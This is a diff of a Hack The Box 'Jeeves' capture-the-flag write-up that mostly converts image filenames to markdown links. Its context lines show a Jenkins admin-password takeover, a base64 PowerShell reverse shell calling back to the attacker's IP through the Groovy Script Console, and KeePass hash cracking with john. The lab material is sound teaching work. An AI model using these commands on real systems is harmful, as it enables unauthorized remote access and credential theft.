@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-Jeeves.png
+![Jeeves.png](../assets/jeeves_assets/Jeeves.png)
 
 ### Enumeration
 
@@ -69,7 +69,7 @@ Nmap done: 1 IP address (1 host up) scanned in 47.66 seconds
 
 Lets also go ahead and kick off some directory scanning against the two ope http ports 80 and 50000, while we continue to poke around:
 
-gubuster.png
+![gubuster.png](../assets/jeeves_assets/gubuster.png)
 
 While my scans are running I take a look at SMB to see if we can access any shares, but with no luck.
 
@@ -77,25 +77,25 @@ Next I turn my attention to manually checking out the http sites.
 
 Port 80 seems to be a non-functioning Ask Jeeves page, which throws an error with any searches:
 
-port_80.png
+![port_80.png](../assets/jeeves_assets/port_80.png)
 
 While port 50000 throws a 404 error, and links to a Jetty webserver product page. Nothing too interesting yet.
 
 Checking back on my Gobuster scans I see an interesting find for port 50000:
 
-askjeeves.png
+![askjeeves.png](../assets/jeeves_assets/askjeeves.png)
 
 ### Exploitation
 
 Navigating to http://10.10.10.63:50000/askjeeves/ I find a Jenkins dashboard. Clicking around some I find I have the option to change the administrator's password. Lets update the credentials to admin:Password and see if we can login that way:
 
-admin_pw.png
+![admin_pw.png](../assets/jeeves_assets/admin_pw.png)
 
 Nice! That worked! We can now successfully login as admin:
 
-admin_login.png
+![admin_login.png](../assets/jeeves_assets/admin_login.png)
 
-From here I was able to navigate to the Script Console. Now I grab a  base64 encoded PowerShell reverse shell from https://www.revshells.com/ and simply paste it in to the command prompt with a bit of Groovy script syntax:
+From here I was able to navigate to the Script Console. Now I can grab a base64 encoded PowerShell reverse shell from https://www.revshells.com/ and simply paste it in to the command prompt with a bit of Groovy script syntax:
 
 ```text
 def command = "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOQAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
@@ -103,15 +103,15 @@ def proc = command.execute()
 println(proc.in.text)
 ```
 
-powershell.png
+![powershell.png](../assets/jeeves_assets/powershell.png)
 
 Which gets me back a a shell as user kohsuke:
 
-shell.png
+![shell.png](../assets/jeeves_assets/shell.png)
 
 where I can then grab user.txt
 
-user_flag.png
+![user_flag.png](../assets/jeeves_assets/user_flag.png)
 
 ### Privilege Escalation
 
@@ -157,7 +157,7 @@ john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt kee_hash.txt
 
 We can crack the login password:
 
-jtr.png
+![jtr.png](../assets/jeeves_assets/jtr.png)
 
 Great! Now we can begin to interact with the database from our command line:
 
@@ -240,7 +240,7 @@ The flag is elsewhere.  Look deeper.
 
 No problem, we can still access the flag using `dir /R`  to find it and `more` to read it:
 
-root_flag.png
+![root_flag.png](../assets/jeeves_assets/root_flag.png)
 
 Thanks for following along!
 
